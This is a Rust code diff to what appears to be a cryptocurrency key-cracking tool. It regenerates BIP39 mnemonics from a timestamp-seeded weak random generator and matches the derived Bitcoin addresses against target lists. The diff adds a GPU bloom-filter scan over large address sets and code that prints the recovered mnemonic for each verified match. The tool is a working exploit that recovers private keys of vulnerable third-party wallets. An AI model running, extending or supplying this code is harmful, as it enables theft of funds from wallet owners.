@@ -2,7 +2,7 @@ use anyhow::{Context, Result};
 use bip39::Mnemonic;
 use bitcoin::bip32::{DerivationPath, Xpriv};
 use bitcoin::key::CompressedPublicKey;
-use bitcoin::secp256k1::Secp256k1;
+use bitcoin::secp256k1::{All, Secp256k1};
 use bitcoin::{Address, Network};
 use std::collections::HashMap;
 use std::path::Path;
@@ -18,8 +18,6 @@ use crate::scans::gpu_solver::GpuSolver;
 /// `time(NULL)` (Unix seconds).
 ///
 /// ## Entropy strategies
-///
-/// Both strategies call `next_u32()` **16 times** for 16 bytes of entropy.
 ///
 /// | Strategy | Extraction | Byte range | Python name |
 /// |---|---|---|---|
@@ -44,10 +42,7 @@ use crate::scans::gpu_solver::GpuSolver;
 /// | 5 | BytePerCallMod | m/49' (P2SH-P2WPKH)  |
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum EntropyStrategy {
-    /// 16 LCG calls, `val & 0xFF` — byte ∈ \[0, 255\].
     BytePerCallAnd,
-
-    /// 16 LCG calls, `val % 0xFF` (= `% 255`) — byte ∈ \[0, 254\], 0xFF never produced.
     BytePerCallMod,
 }
 
@@ -78,11 +73,8 @@ impl EntropyStrategy {
 /// Address type produced by a derivation path.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum AddrType {
-    /// Legacy P2PKH (`1...`), m/44'
     P2Pkh,
-    /// Native SegWit P2WPKH (`bc1q...`), m/84'
     P2Wpkh,
-    /// Wrapped SegWit P2SH-P2WPKH (`3...`), m/49'
     P2ShP2Wpkh,
 }
 
@@ -107,21 +99,13 @@ pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
 }
 
 /// Load addresses from a CSV/text file and scan all of them.
-pub fn run_multi_file(
-    path: &Path,
-    start_ts: u32,
-    end_ts: u32,
-) -> Result<()> {
+pub fn run_multi_file(path: &Path, start_ts: u32, end_ts: u32) -> Result<()> {
     let targets = load_targets_from_csv(path)?;
     run_multi(&targets, start_ts, end_ts)
 }
 
 /// Scan multiple target addresses in a single pass.
-pub fn run_multi(
-    targets: &[String],
-    start_ts: u32,
-    end_ts: u32,
-) -> Result<()> {
+pub fn run_multi(targets: &[String], start_ts: u32, end_ts: u32) -> Result<()> {
     if targets.is_empty() {
         anyhow::bail!("No target addresses provided.");
     }
@@ -174,9 +158,7 @@ pub fn run_multi(
         {
             info!(
                 "[GPU] Scanning target {}/{}: {}",
-                target_idx + 1,
-                valid_targets.len(),
-                target_addr
+                target_idx + 1, valid_targets.len(), target_addr
             );
 
             let hits =
@@ -193,8 +175,8 @@ pub fn run_multi(
                     Ok(m)  => m,
                     Err(e) => { warn!("[GPU] bad entropy ts={}: {}", timestamp, e); continue; }
                 };
-                let seed = mnemonic.to_seed("");
-                let root = match Xpriv::new_master(network, &seed) {
+                let seed  = mnemonic.to_seed("");
+                let root  = match Xpriv::new_master(network, &seed) {
                     Ok(r)  => r,
                     Err(e) => { warn!("[GPU] master key ts={}: {}", timestamp, e); continue; }
                 };
@@ -241,10 +223,7 @@ pub fn run_multi(
             }
         }
 
-        info!(
-            "[GPU] All targets scanned in {:.2}s.",
-            t0.elapsed().as_secs_f64()
-        );
+        info!("[GPU] All targets scanned in {:.2}s.", t0.elapsed().as_secs_f64());
         return Ok(());
     }
 
@@ -262,10 +241,7 @@ pub fn run_multi(
             ("m/84'/0'/0'/0/0", AddrType::P2Wpkh),
             ("m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
         ];
-        let strategies = [
-            EntropyStrategy::BytePerCallAnd,
-            EntropyStrategy::BytePerCallMod,
-        ];
+        let strategies = [EntropyStrategy::BytePerCallAnd, EntropyStrategy::BytePerCallMod];
 
         let mut found_any = false;
         let mut checked   = 0u64;
@@ -331,20 +307,14 @@ pub fn run_multi(
                         warn!("  AddrType  : {:?}", addr_type);
                         warn!("  Mnemonic  : {}", mnemonic);
                         found_any = true;
-
-                        if targets.len() == 1 {
-                            break 'outer;
-                        }
+                        if targets.len() == 1 { break 'outer; }
                     }
                 }
             }
 
             checked += 1;
             if checked % 500_000 == 0 {
-                info!(
-                    "[CPU] {} timestamps scanned ({:.1}s)",
-                    checked, t0.elapsed().as_secs_f64()
-                );
+                info!("[CPU] {} timestamps scanned ({:.1}s)", checked, t0.elapsed().as_secs_f64());
             }
         }
 
@@ -358,29 +328,138 @@ pub fn run_multi(
     }
 }
 
+// ─── Bloom filter scan ──────────────────────────────────────────────────────────
+
+/// Scan using a brainflayer-compatible bloom filter (`.blf`) for multi-address lookup.
+///
+/// ## Bloom filter format
+/// Raw bit-array, no header (`hex2blf` / `brainflayer` output).
+/// Expected size: 2³² bits = 512 MB.
+///
+/// Each hash160 sets 5 bits at positions `LE_uint32(h[i*4..i*4+4])` for `i` in 0..5.
+///
+/// ## Verification
+/// Bloom positives (~0.1% false-positive rate) are re-derived on CPU and
+/// looked up in the `HashSet<[u8;20]>` built from `csv_path`.
+///
+/// ## Requires `--features gpu`
+#[cfg(feature = "gpu")]
+pub fn run_bloom(
+    bloom_path: &Path,
+    csv_path: &Path,
+    start_ts: u32,
+    end_ts: u32,
+) -> Result<()> {
+    // ---- Load bloom filter ------------------------------------------------
+    info!("[BLOOM] Loading: {}", bloom_path.display());
+    let t_io = std::time::Instant::now();
+    let bloom_data = std::fs::read(bloom_path)
+        .with_context(|| format!("Cannot read bloom filter: {}", bloom_path.display()))?;
+    info!(
+        "[BLOOM] Loaded {} MB in {:.2}s",
+        bloom_data.len() / 1_048_576,
+        t_io.elapsed().as_secs_f64()
+    );
+
+    // ---- Build verification map -------------------------------------------
+    let targets = load_targets_from_csv(csv_path)?;
+    let network = Network::Bitcoin;
+    let mut h160_to_addr: HashMap<[u8; 20], String> = HashMap::with_capacity(targets.len());
+    for addr_str in &targets {
+        if let Some(h160) = address_to_hash160(addr_str) {
+            h160_to_addr.insert(h160, addr_str.clone());
+        }
+    }
+    info!("[BLOOM] Verification map: {} hash160 entries", h160_to_addr.len());
+
+    info!(
+        "[BLOOM] Range: {} – {} ({} timestamps × 6 combos)",
+        start_ts, end_ts,
+        end_ts.saturating_sub(start_ts) + 1
+    );
+
+    // ---- GPU scan ---------------------------------------------------------
+    let t0     = std::time::Instant::now();
+    let solver = GpuSolver::new()?;
+    info!("[BLOOM] GPU solver initialised (uploading bloom buffer...)");
+
+    let hits = solver.compute_trust_wallet_lcg_bloom(start_ts, end_ts, &bloom_data)?;
+
+    info!(
+        "[BLOOM] GPU scan: {:.2}s, bloom candidates: {}",
+        t0.elapsed().as_secs_f64(),
+        hits.len()
+    );
+
+    if hits.is_empty() {
+        info!("[BLOOM] No candidates found. Scan complete.");
+        return Ok(());
+    }
+
+    // ---- CPU verification -------------------------------------------------
+    let secp    = Secp256k1::new();
+    let mut verified = 0usize;
+
+    for (timestamp, combo) in &hits {
+        let (strategy, path_str, addr_type) = decode_combo(*combo);
+
+        let mut rng     = MinstdRand0::new(*timestamp);
+        let mut entropy = [0u8; 16];
+        strategy.fill_entropy(&mut rng, &mut entropy);
+
+        let mnemonic = match Mnemonic::from_entropy(&entropy) {
+            Ok(m)  => m,
+            Err(e) => { warn!("[BLOOM] bad entropy ts={}: {}", timestamp, e); continue; }
+        };
+        let seed  = mnemonic.to_seed("");
+        let root  = match Xpriv::new_master(network, &seed) {
+            Ok(r)  => r,
+            Err(e) => { warn!("[BLOOM] master key ts={}: {}", timestamp, e); continue; }
+        };
+        let path  = DerivationPath::from_str(path_str)?;
+        let child = match root.derive_priv(&secp, &path) {
+            Ok(c)  => c,
+            Err(e) => { warn!("[BLOOM] derive ts={}: {}", timestamp, e); continue; }
+        };
+
+        let h160 = match derive_hash160(&secp, &child, addr_type, network) {
+            Some(h) => h,
+            None    => { warn!("[BLOOM] hash160 failed ts={} combo={}", timestamp, combo); continue; }
+        };
+
+        if let Some(addr_str) = h160_to_addr.get(&h160) {
+            warn!("\n\u{1F3AF} [BLOOM VERIFIED] FOUND MATCH!");
+            warn!("  Address   : {}", addr_str);
+            warn!("  Timestamp : {}", timestamp);
+            warn!("  Strategy  : {}", strategy.name());
+            warn!("  Path      : {}", path_str);
+            warn!("  AddrType  : {:?}", addr_type);
+            warn!("  Mnemonic  : {}", mnemonic);
+            verified += 1;
+        } else {
+            warn!(
+                "[BLOOM] False positive: ts={} combo={} (bloom hit, not in address set)",
+                timestamp, combo
+            );
+        }
+    }
+
+    info!(
+        "[BLOOM] Done. Verified: {}/{} candidates. Total: {:.2}s",
+        verified, hits.len(), t0.elapsed().as_secs_f64()
+    );
+    Ok(())
+}
+
 // ─── CSV loader ─────────────────────────────────────────────────────────────
 
 /// Load Bitcoin addresses from a plain-text or CSV file.
-///
-/// ## Supported format
-/// ```text
-/// # Comment lines are ignored
-/// 1BpEi6DfDAUFd153wiGrvkiKW1iHBa4Lnn
-/// 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy , label
-/// bc1qcygs9dl4pnw68x2lnde... , optional_label
-/// ```
-///
-/// Rules:
-/// - Lines starting with `#` are skipped.
-/// - Blank lines are skipped.
-/// - First token (comma/tab/space delimited) is the address; extra columns ignored.
-/// - Accepts mainnet P2PKH (`1...`), P2SH (`3...`), and P2WPKH (`bc1q...`).
-/// - Duplicates are deduplicated (first occurrence wins).
+/// Accepts P2PKH (`1...`), P2SH (`3...`), and P2WPKH (`bc1q...`).
 pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
     use std::fs::File;
     use std::io::{BufRead, BufReader};
 
-    let file = File::open(path)
+    let file    = File::open(path)
         .with_context(|| format!("Cannot open targets file: {}", path.display()))?;
     let reader  = BufReader::new(file);
     let network = Network::Bitcoin;
@@ -393,92 +472,91 @@ pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
         line_no += 1;
         let line    = line.with_context(|| format!("I/O error at line {}", line_no))?;
         let trimmed = line.trim();
-
-        if trimmed.is_empty() || trimmed.starts_with('#') {
-            continue;
-        }
+        if trimmed.is_empty() || trimmed.starts_with('#') { continue; }
 
         let addr = trimmed
             .splitn(2, |c| c == ',' || c == '\t' || c == ' ')
-            .next()
-            .unwrap_or(trimmed)
-            .trim();
+            .next().unwrap_or(trimmed).trim();
+        if addr.is_empty() { continue; }
 
-        if addr.is_empty() {
-            continue;
-        }
-
-        // Validate: mainnet P2PKH, P2SH, or P2WPKH
         let valid = Address::from_str(addr)
             .ok()
             .and_then(|a| a.require_network(network).ok())
-            .map(|a| {
-                let s = a.script_pubkey();
-                s.is_p2pkh() || s.is_p2sh() || s.is_p2wpkh()
-            })
+            .map(|a| { let s = a.script_pubkey(); s.is_p2pkh() || s.is_p2sh() || s.is_p2wpkh() })
             .unwrap_or(false);
 
         if valid {
             let owned = addr.to_string();
-            if seen.insert(owned.clone()) {
-                addresses.push(owned);
-            }
+            if seen.insert(owned.clone()) { addresses.push(owned); }
         } else {
-            warn!(
-                "[CSV] Line {}: skipping {:?} — not a mainnet P2PKH/P2SH/P2WPKH address",
-                line_no, addr
-            );
+            warn!("[CSV] Line {}: skipping {:?} — not a mainnet P2PKH/P2SH/P2WPKH address",
+                  line_no, addr);
         }
     }
 
     if addresses.is_empty() {
-        anyhow::bail!(
-            "No valid Bitcoin mainnet P2PKH/P2SH/P2WPKH addresses found in {}",
-            path.display()
-        );
+        anyhow::bail!("No valid Bitcoin mainnet P2PKH/P2SH/P2WPKH addresses found in {}",
+                      path.display());
     }
-
-    info!(
-        "[CSV] Loaded {} unique target address(es) from {}",
-        addresses.len(),
-        path.display()
-    );
+    info!("[CSV] Loaded {} unique target address(es) from {}", addresses.len(), path.display());
     Ok(addresses)
 }
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 
-/// Extract the 20-byte Hash160 payload from a P2PKH, P2SH, or P2WPKH address.
-/// Returns `None` for unsupported script types.
+/// Extract the 20-byte Hash160 payload from a P2PKH, P2SH, or P2WPKH address string.
+/// Used to build the verification map for GPU scans.
 ///
 /// Script layouts:
-///   P2PKH  (25 bytes): OP_DUP OP_HASH160 OP_DATA_20 <hash160> OP_EQUALVERIFY OP_CHECKSIG
-///                      bytes[3..23] = hash160
-///   P2SH   (23 bytes): OP_HASH160 OP_DATA_20 <hash160> OP_EQUAL
-///                      bytes[2..22] = hash160
-///   P2WPKH (22 bytes): OP_0 OP_DATA_20 <hash160>
-///                      bytes[2..22] = hash160
+///   P2PKH  (25 bytes): [OP_DUP OP_HASH160 OP_DATA_20 <20b> OP_EQUALVERIFY OP_CHECKSIG] → bytes[3..23]
+///   P2SH   (23 bytes): [OP_HASH160 OP_DATA_20 <20b> OP_EQUAL]                           → bytes[2..22]
+///   P2WPKH (22 bytes): [OP_0 OP_DATA_20 <20b>]                                           → bytes[2..22]
 #[cfg(feature = "gpu")]
 fn address_to_hash160(addr_str: &str) -> Option<[u8; 20]> {
     let address = Address::from_str(addr_str).ok()?.assume_checked();
     let script  = address.script_pubkey();
     let bytes   = script.as_bytes();
-    if script.is_p2pkh() && bytes.len() == 25 {
-        bytes[3..23].try_into().ok()
-    } else if script.is_p2sh() && bytes.len() == 23 {
-        bytes[2..22].try_into().ok()
-    } else if script.is_p2wpkh() && bytes.len() == 22 {
-        bytes[2..22].try_into().ok()
-    } else {
-        None
+    if      script.is_p2pkh()  && bytes.len() == 25 { bytes[3..23].try_into().ok() }
+    else if script.is_p2sh()   && bytes.len() == 23 { bytes[2..22].try_into().ok() }
+    else if script.is_p2wpkh() && bytes.len() == 22 { bytes[2..22].try_into().ok() }
+    else { None }
+}
+
+/// Re-derive the Hash160 from a child key for CPU verification of GPU hits.
+/// Returns the same hash160 that the OpenCL kernel computed.
+#[cfg(feature = "gpu")]
+fn derive_hash160(
+    secp:      &Secp256k1<All>,
+    child:     &Xpriv,
+    addr_type: AddrType,
+    network:   Network,
+) -> Option<[u8; 20]> {
+    let script = match addr_type {
+        AddrType::P2Pkh => {
+            let pk = child.to_keypair(secp).public_key();
+            Address::p2pkh(bitcoin::PublicKey::new(pk), network).script_pubkey()
+        }
+        AddrType::P2Wpkh => {
+            let cpk = CompressedPublicKey::from_private_key(secp, &child.to_priv()).ok()?;
+            Address::p2wpkh(&cpk, network).script_pubkey()
+        }
+        AddrType::P2ShP2Wpkh => {
+            let cpk = CompressedPublicKey::from_private_key(secp, &child.to_priv()).ok()?;
+            Address::p2shwpkh(&cpk, network).script_pubkey()
+        }
+    };
+    let bytes = script.as_bytes();
+    match addr_type {
+        AddrType::P2Pkh      if bytes.len() == 25 => bytes[3..23].try_into().ok(),
+        AddrType::P2Wpkh     if bytes.len() == 22 => bytes[2..22].try_into().ok(),
+        AddrType::P2ShP2Wpkh if bytes.len() == 23 => bytes[2..22].try_into().ok(),
+        _ => None,
     }
 }
 
 // ─── MinstdRand0 ─────────────────────────────────────────────────────────────
 
-struct MinstdRand0 {
-    state: u32,
-}
+struct MinstdRand0 { state: u32 }
 
 impl MinstdRand0 {
     fn new(seed: u32) -> Self {
@@ -503,8 +581,6 @@ mod tests {
     use super::*;
     use std::io::Write;
 
-    // ---- MinstdRand0 -------------------------------------------------------
-
     #[test]
     fn test_minstd_first_two_outputs() {
         let mut rng = MinstdRand0::new(1);
@@ -527,19 +603,14 @@ mod tests {
         assert_eq!(rm.next_u32(), r1.next_u32());
     }
 
-    // ---- EntropyStrategy ---------------------------------------------------
-
     #[test]
     fn test_mod_strategy_never_produces_0xff() {
         for seed in [1u32, 99_999, 1_000_000, 1_498_780_800, 1_685_836_800] {
             let mut rng = MinstdRand0::new(seed);
             let mut buf = [0u8; 16];
             EntropyStrategy::BytePerCallMod.fill_entropy(&mut rng, &mut buf);
-            assert!(
-                !buf.contains(&0xFF),
-                "BytePerCallMod produced 0xFF for seed {}: {:02x?}",
-                seed, buf
-            );
+            assert!(!buf.contains(&0xFF),
+                    "BytePerCallMod produced 0xFF for seed {}: {:02x?}", seed, buf);
         }
     }
 
@@ -552,8 +623,6 @@ mod tests {
         EntropyStrategy::BytePerCallMod.fill_entropy(&mut MinstdRand0::new(seed), &mut bm);
         assert_ne!(ba, bm);
     }
-
-    // ---- decode_combo -------------------------------------------------------
 
     #[test]
     fn test_decode_combo_coverage() {
@@ -573,8 +642,6 @@ mod tests {
         }
     }
 
-    // ---- load_targets_from_csv ---------------------------------------------
-
     fn write_temp_csv(content: &str) -> tempfile::NamedTempFile {
         let mut f = tempfile::NamedTempFile::new().expect("tempfile");
         write!(f, "{}", content).expect("write");
@@ -583,10 +650,7 @@ mod tests {
 
     #[test]
     fn test_csv_single_address_per_line() {
-        let content = "# comment\n\
-                       1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf NA\n\
-                       \n\
-                       1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf NA\n";
+        let content = "# comment\n1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf NA\n\n1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf NA\n";
         let f = write_temp_csv(content);
         let result = load_targets_from_csv(f.path()).unwrap();
         assert_eq!(result.len(), 1);
@@ -601,10 +665,8 @@ mod tests {
         assert_eq!(result[0], "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf");
     }
 
-    /// P2SH address (3...) must be accepted.
     #[test]
     fn test_csv_p2sh_address_accepted() {
-        // 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy is a well-known mainnet P2SH address
         let content = "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy,label\n";
         let f = write_temp_csv(content);
         let result = load_targets_from_csv(f.path()).unwrap();
@@ -613,14 +675,26 @@ mod tests {
 
     #[test]
     fn test_csv_all_invalid_returns_error() {
-        let content = "not_an_address\nETH_ADDRESS_0x1234\n";
+        let content = "not_an_address\nETH_0x1234\n";
         let f = write_temp_csv(content);
         assert!(load_targets_from_csv(f.path()).is_err());
     }
 
+    /// Bloom filter format verification:
+    /// For address 122rNgKfAPsN7BuRMdUdpwY2jekg9SQaqM
+    /// hash160 = 0b51c1c3176d303854ac4b4d842ba70ba90884f4
+    /// 5 uint32-LE bit indices:
+    ///   n0 = 0xC3C1510B  n1 = 0x38306D17  n2 = 0x4D4BAC54
+    ///   n3 = 0x0BA72B84  n4 = 0xF48408A9
     #[test]
-    #[ignore = "No reference vector until original iOS binary is confirmed"]
-    fn test_known_vector() {
-        todo!("Fill from reference implementation")
+    fn test_bloom_bit_indices_known_vector() {
+        let hash160 = hex::decode("0b51c1c3176d303854ac4b4d842ba70ba90884f4").unwrap();
+        let expected_indices: [u32; 5] = [
+            0xC3C1510B, 0x38306D17, 0x4D4BAC54, 0x0BA72B84, 0xF48408A9,
+        ];
+        for i in 0..5usize {
+            let idx = u32::from_le_bytes(hash160[i*4..i*4+4].try_into().unwrap());
+            assert_eq!(idx, expected_indices[i], "bloom index mismatch at i={}", i);
+        }
     }
 }
